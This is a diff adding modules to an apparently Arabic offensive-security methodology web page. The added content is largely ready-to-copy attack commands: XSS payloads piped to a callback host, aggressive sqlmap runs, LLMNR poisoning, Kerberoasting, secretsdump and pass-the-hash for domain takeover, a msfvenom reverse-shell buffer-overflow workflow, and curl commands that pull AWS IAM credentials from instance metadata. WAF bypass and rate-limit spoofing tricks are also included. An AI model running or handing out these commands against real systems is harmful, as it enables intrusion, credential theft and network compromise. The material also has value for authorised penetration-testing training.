@@ -21,6 +21,53 @@
     .quiz-option:hover:not(:disabled) { background: #2d3345; border-color: var(--accent-primary); }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.min.js"></script>
+
+<style>
+/* Enforce strict LTR on code, commands, tables, and pipeline flowcharts */
+.cmd-block, .cmd-block pre, .cmd-block code, 
+.pipeline-flowchart, .pipe-node, .tree-container, 
+#pm-out-grid, #nuc-yaml-out, #rpt-out-text, #sast-cmd-out,
+.table-wrapper table.interactive-table, pre, code {
+  direction: ltr !important;
+  text-align: left !important;
+}
+
+.pipeline-flowchart {
+  display: flex !important;
+  flex-direction: row !important;
+  direction: ltr !important;
+  justify-content: space-between;
+}
+
+.pipe-node {
+  direction: ltr !important;
+  text-align: center !important;
+}
+
+/* Hero Section Layout in Arabic */
+.cyber-hero {
+  direction: rtl;
+  text-align: right;
+  margin-bottom: 20px;
+}
+
+.hero-title {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  flex-wrap: wrap;
+  direction: ltr !important;
+  text-align: left !important;
+  font-family: 'Outfit', 'Inter', sans-serif;
+}
+
+.meth-item {
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+</style>
+
 </head>
 <body>
 
@@ -462,6 +509,22 @@
       
       
       <!-- Category: MASTER ROADMAPS (COMPLETE TRACKS) -->
+      <div class="sidebar-category">
+        <div class="category-title" onclick="toggleCategory('cat-master-roadmaps')">
+          <span style="color: #00ff66;">🗺️ MASTER ROADMAPS (خارطة العمل الكاملة)</span>
+          <span>▼</span>
+        </div>
+        <div class="category-items" id="cat-master-roadmaps" style="display: block;">
+          <div class="meth-item active" id="meth-ef-master_web_bounty" onclick="openMethPhase('master_web_bounty')" data-search="master roadmap web bug bounty end to end recon xss sqli idor logic">
+            <span>🎯</span> <strong style="color:#00e5ff;">Track 1: Web Bug Bounty Roadmap</strong>
+          </div>
+          <div class="meth-item" id="meth-ef-master_net_ad" onclick="openMethPhase('master_net_ad')" data-search="master roadmap network active directory bof domain admin responder kerberoast bloodhound">
+            <span>👑</span> <strong style="color:#ffb86c;">Track 2: Network, AD & BOF Roadmap</strong>
+          </div>
+        </div>
+      </div>
+
+            <!-- Category: MASTER ROADMAPS (COMPLETE TRACKS) -->
       <div class="sidebar-category">
         <div class="category-title" onclick="toggleCategory('cat-master-roadmaps')">
           <span style="color: #00ff66;">🗺️ MASTER ROADMAPS (خارطة العمل الكاملة)</span>
@@ -9795,6 +9858,487 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b " " -f c</
         </div>
       </div>
 
+
+      <!-- ═══════════════════════════════════════════════════════════
+           TRACK 1: COMPLETE WEB & BUG BOUNTY ROADMAP (END-TO-END)
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-master_web_bounty" style="display: block; --tool-color: #00e5ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🎯</span> Track 1: Complete Web & Bug Bounty Roadmap</h2>
+          <p class="hero-tagline">خطة العمل الكاملة والشاملة لاختراق الويب والصيد في برامج الـ Bug Bounty من جمع المعلومات وحتى اكتشاف الثغرة واستلام الـ Bounty!</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔥 Master Playbook</span>
+            <span class="badge badge-tool">🔧 Subfinder · Httpx · Katana · GF · Dalfox · SQLmap · Burp Suite</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📌 خطة مسار الويب والـ Bug Bounty (4 مراحل متتالية)</h3></div>
+          
+          <div style="border-left: 3px solid #00e5ff; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#00e5ff; font-size:1.1rem; margin-bottom:8px;">المرحلة 1: Recon & Scope Filtering (جمع المعلومات وتصفية الأهداف)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">الهدف: تجميع كافة النطاقات والـ IPs الحية التابعة للمؤسسة وتصفيتها لاستخراج الأهداف ذات الحساسية العالية.</p>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">1.1 Subdomain Enumeration & Passive Mining</span></div>
+              <pre><code>subfinder -d target.com -all -silent | assetfinder --subs-only target.com | sort -u > all_subs.txt
+crt.sh -q -f %target.com | grep target.com | cut -d ">" -f2 | cut -d "<" -f1 | sort -u >> all_subs.txt</code></pre>
+            </div>
+
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">1.2 Alive Filter & Tech Fingerprinting</span></div>
+              <pre><code>cat all_subs.txt | httpx -silent -sc -title -td -web-server -o alive_hosts.txt
+grep -E "dev|staging|admin|api|test|internal|stage|vpn|portal" alive_hosts.txt > priority_targets.txt</code></pre>
+            </div>
+          </div>
+
+          <div style="border-left: 3px solid #00ff66; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#00ff66; font-size:1.1rem; margin-bottom:8px;">المرحلة 2: Content Discovery & JS Mining (استخراج الـ Endpoints والروابط)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">الهدف: استخراج كل الروابط التاريخية والـ JavaScript Files والـ Parameters المخفية.</p>
+
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">2.1 Crawling & Wayback Mining</span></div>
+              <pre><code>katana -u priority_targets.txt -jc -d 5 -silent -o crawled_urls.txt
+waybackurls target.com | gau --threads 10 >> crawled_urls.txt
+sort -u crawled_urls.txt > all_urls.txt</code></pre>
+            </div>
+
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">2.2 GF Pattern Filtering for Parameters</span></div>
+              <pre><code>cat all_urls.txt | gf xss | grep "=" > xss_params.txt
+cat all_urls.txt | gf sqli | grep "=" > sqli_params.txt
+cat all_urls.txt | gf ssrf | grep "=" > ssrf_params.txt
+cat all_urls.txt | gf idor | grep "=" > idor_params.txt
+cat all_urls.txt | gf lfi | grep "=" > lfi_params.txt</code></pre>
+            </div>
+          </div>
+
+          <div style="border-left: 3px solid #f97316; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#f97316; font-size:1.1rem; margin-bottom:8px;">المرحلة 3: Vulnerability Hunting Pipelines (مسارات فحص واستغلال الثغرات)</h4>
+
+            <h5 style="color:#00e5ff; margin-top:10px;">⚡ 3.1 XSS Automated Pipeline:</h5>
+            <div class="cmd-block">
+              <pre><code>cat xss_params.txt | qsreplace '"&gt;&lt;script&gt;confirm(1)&lt;/script&gt;' | dalfox pipe --multicast -b https://your-xss-hunter.com</code></pre>
+            </div>
+
+            <h5 style="color:#00e5ff; margin-top:10px;">💉 3.2 SQL Injection Pipeline:</h5>
+            <div class="cmd-block">
+              <pre><code>sqlmap -m sqli_params.txt --batch --random-agent --risk 3 --level 5 --dbs</code></pre>
+            </div>
+
+            <h5 style="color:#00e5ff; margin-top:10px;">🔑 3.3 IDOR & Logic Flaws Manual Verification:</h5>
+            <ul style="color:#cbd5e1; line-height:1.8; margin-right:20px;">
+              <li>شغّل إضافة <strong>Autorize</strong> في Burp Suite واستبدل الكوكيز بـ User B.</li>
+              <li>استبدل <code>user_id=101</code> بـ <code>user_id=102</code> في جميع طلبات الـ REST API.</li>
+              <li>اختبر المبالغ السلبية <code>"quantity": -1</code> والتنقل المباشر لصفحات الـ Success في عملية الشراء.</li>
+            </ul>
+          </div>
+
+          <div style="border-left: 3px solid #a855f7; padding-left: 15px;">
+            <h4 style="color:#a855f7; font-size:1.1rem; margin-bottom:8px;">المرحلة 4: PoC Creation & Bug Report (إعداد التقرير واستلام المكافأة)</h4>
+            <p style="color:#cbd5e1; line-height:1.6;">استخدم حاسبة الـ **CVSS 3.1 & Report Builder** المدمجة بالدليل لصياغة تقرير محكم وإرساله لمنصة HackerOne / Bugcrowd!</p>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           TRACK 2: NETWORK, ACTIVE DIRECTORY & BOF ROADMAP (END-TO-END)
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-master_net_ad" style="display: none; --tool-color: #ffb86c;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">👑</span> Track 2: Network, Active Directory & BOF Roadmap</h2>
+          <p class="hero-tagline">خطة العمل الكاملة لااختراق الشبكات، الـ Active Directory من الصفر وحتى الـ Domain Admin، والـ Buffer Overflow!</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔥 Master Playbook</span>
+            <span class="badge badge-tool">🔧 Nmap · Responder · Impacket · CrackMapExec · BloodHound · Mona.py</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📌 خطة مسار الشبكات والـ Active Directory (4 مراحل متتالية)</h3></div>
+
+          <div style="border-left: 3px solid #ffb86c; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#ffb86c; font-size:1.1rem; margin-bottom:8px;">المرحلة 1: Network Recon & Port Scanning (استكشاف الشبكة والمنافذ)</h4>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">1.1 Host Discovery & Fast Port Scanning</span></div>
+              <pre><code>netdiscover -r 192.168.1.0/24 -i eth0
+naabu -host 192.168.1.0/24 -top-ports 1000 -o live_ports.txt
+nmap -sC -sV -p- -iL live_ports.txt -oA nmap_full_scan</code></pre>
+            </div>
+          </div>
+
+          <div style="border-left: 3px solid #00e5ff; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#00e5ff; font-size:1.1rem; margin-bottom:8px;">المرحلة 2: Service Enumeration (فحص وتجميع بيانات الخدمات)</h4>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">2.1 SMB & SNMP Enumeration</span></div>
+              <pre><code>enum4linux-ng -A 192.168.1.50
+smbclient -L //192.168.1.50/ -N
+crackmapexec smb 192.168.1.0/24 --shares
+
+onesixtyone -c public -i targets.txt
+snmpwalk -v2c -c public 192.168.1.50 1.3.6.1.4.1.77.1.2.25</code></pre>
+            </div>
+          </div>
+
+          <div style="border-left: 3px solid #ef4444; padding-left: 15px; margin-bottom: 25px;">
+            <h4 style="color:#ef4444; font-size:1.1rem; margin-bottom:8px;">المرحلة 3: Active Directory Hacking (من الصفر إلى Domain Admin)</h4>
+
+            <h5 style="color:#ffb86c; margin-top:10px;">3.1 LLMNR/NBT-NS Poisoning (سرقة الـ NTLMv2 Hashes):</h5>
+            <div class="cmd-block">
+              <pre><code>responder -I eth0 -dwv
+hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+
+            <h5 style="color:#ffb86c; margin-top:10px;">3.2 AS-REP Roasting & Kerberoasting (Impacket Suite):</h5>
+            <div class="cmd-block">
+              <pre><code>impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
+impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt
+hashcat -m 18200 kerberoast.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            </div>
+
+            <h5 style="color:#ffb86c; margin-top:10px;">3.3 BloodHound Mapping & DCSync Domain Takeover:</h5>
+            <div class="cmd-block">
+              <pre><code>bloodhound-python -u 'user' -p 'password' -d domain.local -ns 192.168.1.10 -c All
+impacket-secretsdump domain.local/Administrator:password@192.168.1.10
+impacket-wmiexec -hashes :NTLM_HASH DomainAdmin@192.168.1.10</code></pre>
+            </div>
+          </div>
+
+          <div style="border-left: 3px solid #a855f7; padding-left: 15px;">
+            <h4 style="color:#a855f7; font-size:1.1rem; margin-bottom:8px;">المرحلة 4: Buffer Overflow Exploitation (هندسة عكسية للذاكرة)</h4>
+            
+            <div class="cmd-block" style="margin-top:10px;">
+              <div class="cmd-header"><span class="cmd-lang">BOF Step-by-Step Mona Commands</span></div>
+              <pre><code># 1. Generate Cyclic Pattern to find EIP Offset
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+!mona findmsp
+
+# 2. Identify Bad Characters
+!mona bytearray -b "\x00"
+
+# 3. Find JMP ESP Module (No SEH, No ASLR, No DEP)
+!mona jmp -r esp -cpb "\x00"
+
+# 4. Generate Reverse Shell Payload with msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b "\x00" -f c</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: WAF & CDN Bypass
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-waf_bypass" style="display: none; --tool-color: #00e5ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🛡️</span> WAF & CDN Bypass — Discovering Real Origin IP</h2>
+          <p class="hero-tagline">منهجية تجاوز حماية Cloudflare وAkamai واكتشاف العنوان الحقيقي للسيرفر (Origin IP)</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔴 High Impact</span>
+            <span class="badge badge-tool">🔧 Censys · Shodan · SecurityTrails · CloudFail</span>
+          </div>
+        </div>
+
+        <div class="info-duo">
+          <div class="info-box what">
+            <h5>📖 ما هو الـ WAF Bypass عن طريق Origin IP؟</h5>
+            <p>تستخدم معظم الشركات خدمات CDN/WAF مثل Cloudflare أو Akamai لحجب الهجمات وتصفية الترافيك. لكن السيرفر الأصلي (Origin Server) يظل قادماً من IP حقيقي. إذا تمكنت من كشف هذا الـ IP، يمكنك الاتصال به مباشرة والتلافي التام لكل قواعد الـ WAF والـ Rate Limiting!</p>
+          </div>
+          <div class="info-box goal">
+            <h5>🎯 المنهجية الأساسية للبحث</h5>
+            <p>1. البحث في شهادات الـ SSL التاريخية والحالية.<br>
+               2. فحص سجلات الـ DNS التاريخية قبل تفعيل WAF.<br>
+               3. استدراج السيرفر للاتصال بك (Outbound Triggers) وقراءة الـ IP المتصل.<br>
+               4. التلاعب بترويسات الـ HTTP (Host Header & Forwarded Headers).</p>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ الطرق 4 الرئيسية لاكتشاف الـ Origin IP</h3></div>
+          
+          <h4 style="color:#00e5ff;">1. SSL Certificate SAN Matching (Censys / Shodan)</h4>
+          <div class="cmd-block">
+            <div class="cmd-header"><span class="cmd-lang">Censys & Shodan Queries</span></div>
+            <pre><code>censys search "services.tls.certificates.leaf_data.names: target.com and not services.service_name: CLOUDFLARE"
+shodan search ssl:"target.com" -http.title:"Cloudflare"</code></pre>
+          </div>
+
+          <h4 style="color:#00e5ff; margin-top:20px;">2. Direct IP Validation via cURL</h4>
+          <div class="cmd-block">
+            <div class="cmd-header"><span class="cmd-lang">cURL Direct IP Test</span></div>
+            <pre><code>curl -k -H "Host: target.com" https://192.0.2.45/</code></pre>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Subdomain Takeover & Cloud Recon
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-subdom_takeover" style="display: none; --tool-color: #ff9a56;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">☁️</span> Subdomain Takeover & Cloud Asset Recon</h2>
+          <p class="hero-tagline">اكتشاف النطاقات الفرعية المتروكة (Dangling DNS) واستغلال خدمات السحاب المفتوحة</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔴 High / Critical Risk</span>
+            <span class="badge badge-tool">🔧 Subjack · Subzy · Nuclei · Cloud_enum</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📊 Matrix: أشهر الخدمات السحابية وبصمات الثغرة</h3></div>
+          
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr><th>الخدمة السحابية (SaaS/Cloud)</th><th>CNAME Target Pattern</th><th>HTTP Error Fingerprint (بصمة الخطأ)</th><th>مستوى الخطورة</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>GitHub Pages</strong></td><td><code>*.github.io</code></td><td><code>There isn't a GitHub Pages site here.</code></td><td><span class="badge badge-high">High</span></td></tr>
+              <tr><td><strong>Amazon S3 Bucket</strong></td><td><code>*.s3.amazonaws.com</code></td><td><code>The specified bucket does not exist</code></td><td><span class="badge badge-high">High</span></td></tr>
+              <tr><td><strong>Heroku App</strong></td><td><code>*.herokuapp.com</code></td><td><code>No such app / Heroku | No such app</code></td><td><span class="badge badge-high">High</span></td></tr>
+              <tr><td><strong>Azure App Service</strong></td><td><code>*.azurewebsites.net</code></td><td><code>404 Web App NOT Found</code></td><td><span class="badge badge-high">High</span></td></tr>
+            </tbody>
+          </table></div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Business Logic Vulnerabilities
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-biz_logic" style="display: none; --tool-color: #a855f7;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🧠</span> Business Logic Vulnerabilities & Flaws</h2>
+          <p class="hero-tagline">ثغرات منطق التطبيق والتلاعب في عمليات الدفع والحسابات — حيث تفشل جميع أدوات الفحص التلقائي!</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔴 High / Critical Risk</span>
+            <span class="badge badge-tool">🔧 Burp Suite Repeater · Manual Logic Testing</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>💡 الأنواع الـ 4 الأكثر انتشاراً وكيفية اكتشافها</h3></div>
+          
+          <h4 style="color:#a855f7;">1. Price & Payment Manipulation (التلاعب المالي)</h4>
+          <ul style="color:#cbd5e1; line-height:1.8; margin-right:20px;">
+            <li><strong>Negative Quantity / Price:</strong> إرسال كمية سالبة <code>"quantity": -1</code> لخصم المبلغ من الإجمالي!</li>
+            <li><strong>Currency Code Swapping:</strong> تغيير العملة من <code>USD</code> إلى <code>INR</code> دون تحويل السعر المعروض.</li>
+          </ul>
+
+          <h4 style="color:#a855f7; margin-top:20px;">2. Rate Limit Bypass via Header Manipulation</h4>
+          <div class="cmd-block">
+            <pre><code>X-Forwarded-For: 127.0.0.1
+X-Real-IP: 192.168.1.100
+X-Client-IP: 10.0.0.1</code></pre>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Mobile App & API Recon
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-mobile_recon" style="display: none; --tool-color: #10b981;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">📱</span> Mobile App & API Reconnaissance</h2>
+          <p class="hero-tagline">هندسة عكسية لتطبيقات Android APK & iOS IPA لاستخراج المفاتيح المخفية والـ Endpoints</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔴 High Impact</span>
+            <span class="badge badge-tool">🔧 JADX · Apktool · MobSF · Frida</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ أدوات وخطوات الهندسة العكسية</h3></div>
+          <div class="cmd-block">
+            <pre><code>jadx -d out_dir app.apk
+rg -i "AKIA[0-9A-Z]{16}" out_dir/
+rg -i "AIzaSy[A-Za-z0-9_-]{33}" out_dir/</code></pre>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: CVSS 3.1 Calculator & Report Builder
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-cvss_report" style="display: none; --tool-color: #eab308;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">📊</span> CVSS 3.1 Calculator & Report Builder</h2>
+          <p class="hero-tagline">حاسبة خطورة الثغرات التفاعلية ومولد تقارير HackerOne / Bugcrowd الاحترافي</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header">
+            <h3>🧮 CVSS 3.1 Calculator</h3>
+            <span id="cvss-score-badge" style="background:#ef4444; color:#fff; padding:4px 12px; border-radius:99px; font-weight:bold; font-size:1.1rem;">Score: 9.8 (CRITICAL)</span>
+          </div>
+          
+          <div style="background: rgba(234,179,8,0.05); padding: 15px; border-radius: 8px; border: 1px solid rgba(234,179,8,0.2);">
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap:12px; margin-bottom:15px;">
+              <div>
+                <label style="display:block; color:#eab308; font-weight:bold; font-size:0.85rem; margin-bottom:4px;">Attack Vector (AV):</label>
+                <select id="cvss-av" onchange="calcCVSS()" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+                  <option value="N">Network (N)</option>
+                  <option value="A">Adjacent (A)</option>
+                  <option value="L">Local (L)</option>
+                  <option value="P">Physical (P)</option>
+                </select>
+              </div>
+              <div>
+                <label style="display:block; color:#eab308; font-weight:bold; font-size:0.85rem; margin-bottom:4px;">Scope (S):</label>
+                <select id="cvss-s" onchange="calcCVSS()" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+                  <option value="U">Unchanged (U)</option>
+                  <option value="C">Changed (C)</option>
+                </select>
+              </div>
+            </div>
+
+            <div style="background:#090d16; padding:10px; border-radius:4px; font-family:monospace; color:#e2e8f0; display:flex; justify-content:space-between; align-items:center;">
+              <div><strong>Vector:</strong> <span id="cvss-vector-str" style="color:#eab308;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span></div>
+              <button onclick="copyCvssVector()" style="background:var(--accent-gold); color:#000; border:none; padding:4px 10px; border-radius:4px; font-weight:bold; cursor:pointer;">Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Burp Extensions Matrix
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-burp_matrix" style="display: none; --tool-color: #ff0055;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🔌</span> Burp Suite Extensions Matrix</h2>
+          <p class="hero-tagline">أقوى إضافات Burp Suite Pro التي يرافقها كل الباحثين المحترفين لاكتشاف الثغرات المعقدة</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🏆 جدول أهم إضافات Burp Suite</h3></div>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr><th>Extension</th><th>التخصص</th><th>كيف تساعدك؟</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>Autorize</strong></td><td>IDOR & Auth</td><td>تكرار الطلبات تلقائياً بحساب ذو صلاحية أقل لكشف IDOR فوراً!</td></tr>
+              <tr><td><strong>Param Miner</strong></td><td>Cache Poisoning</td><td>تفحص الخفاء للترويسات والبارامترات غير المعلنة.</td></tr>
+              <tr><td><strong>Turbo Intruder</strong></td><td>Race Conditions</td><td>إرسال الطلبات في نفس الجزء من الملي ثانية بـ HTTP/2 Single-Packet Attack.</td></tr>
+            </tbody>
+          </table></div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Payload Mutator & Encoder
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-payload_mutator" style="display: none; --tool-color: #00e5ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🔮</span> Payload Mutator & Encoder Suite</h2>
+          <p class="hero-tagline">تحويل وتشفير الـ Payloads لـ +8 صيغ مختلفة تلقائياً لتجاوز فلاتر الـ WAF</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚡ Multi-Format Generator</h3></div>
+          <div style="background:rgba(0,229,255,0.05); padding:15px; border-radius:8px; border:1px solid rgba(0,229,255,0.2);">
+            <label style="display:block; color:#00e5ff; font-weight:bold; margin-bottom:5px;">Input Raw Payload:</label>
+            <textarea id="pm-raw-input" oninput="mutatePayload()" style="width:100%; height:60px; padding:10px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px; font-family:monospace; margin-bottom:15px;" placeholder="<script>alert(1)</script>"></textarea>
+            
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap:12px;" id="pm-out-grid"></div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Nuclei Custom Template Generator
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-nuclei_builder" style="display: none; --tool-color: #00ff66;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">⚙️</span> Nuclei Custom Template Generator</h2>
+          <p class="hero-tagline">إنشاء قوالب YAML مخصصة لأداة Nuclei بضغطة زر وتنزيلها مباشرة</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ Custom YAML Builder</h3></div>
+          <div style="background:rgba(0,255,102,0.05); padding:15px; border-radius:8px; border:1px solid rgba(0,255,102,0.2);">
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:10px;">
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Template ID:</label>
+                <input type="text" id="nuc-id" value="custom-cve-check" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+              </div>
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Severity:</label>
+                <select id="nuc-sev" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+                  <option value="critical">Critical</option>
+                  <option value="high">High</option>
+                  <option value="medium">Medium</option>
+                </select>
+              </div>
+            </div>
+            
+            <button class="cmd-btn" onclick="generateNucleiYaml()" style="background:#00ff66; color:#000; border:none; padding:8px 16px; border-radius:4px; font-weight:bold; cursor:pointer; margin-bottom:12px;">Build YAML</button>
+            <textarea id="nuc-yaml-out" style="width:100%; height:150px; background:#040914; color:#e2e8f0; font-family:monospace; padding:10px; border:1px solid #00ff66; border-radius:4px;"></textarea>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Instant Bash One-Liners Matrix
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-oneliners_matrix" style="display: none; --tool-color: #f97316;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">⚡</span> Instant Bash One-Liners Arsenal</h2>
+          <p class="hero-tagline">أقوى أوامر الـ Bash والـ Pipelining الجاهزة للنسخ الفوري</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📋 مصفوفة الأوامر السريعة</h3></div>
+          
+          <div style="display:flex; flex-direction:column; gap:10px;">
+            <div style="background:#090d16; padding:10px; border-radius:6px; border-left:3px solid #00e5ff;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                <span style="color:#00e5ff; font-weight:bold; font-size:0.85rem;">1. Full Subdomain Enum & Alive Filter:</span>
+                <button onclick="copyOneLiner(this)" data-cmd="subfinder -d target.com -all -silent | httpx -silent -sc -title -td -o alive_subs.txt" style="background:#00e5ff; color:#000; border:none; padding:2px 6px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.7rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem;">subfinder -d target.com -all -silent | httpx -silent -sc -title -td -o alive_subs.txt</code>
+            </div>
+
+            <div style="background:#090d16; padding:10px; border-radius:6px; border-left:3px solid #00ff66;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                <span style="color:#00ff66; font-weight:bold; font-size:0.85rem;">2. Extract JS Files & Secrets Hunter:</span>
+                <button onclick="copyOneLiner(this)" data-cmd="katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out" style="background:#00ff66; color:#000; border:none; padding:2px 6px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.7rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.8rem;">katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out</code>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE: Cloud Metadata & IMDSv2
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-cloud_metadata" style="display: none; --tool-color: #a855f7;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">☁️</span> Cloud Metadata & IMDSv2 Exploitation</h2>
+          <p class="hero-tagline">دليل سحب التوكنات ومفاتيح الـ IAM من بيئات AWS و Azure و GCP عبر ثغرات الـ SSRF</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>☁️ AWS EC2 Metadata (IMDSv1 & IMDSv2)</h3></div>
+          <div class="cmd-block">
+            <pre><code># AWS IMDSv2 Token Request
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name</code></pre>
+          </div>
+        </div>
+      </div>
+
     </div> <!-- end meth-viewer -->
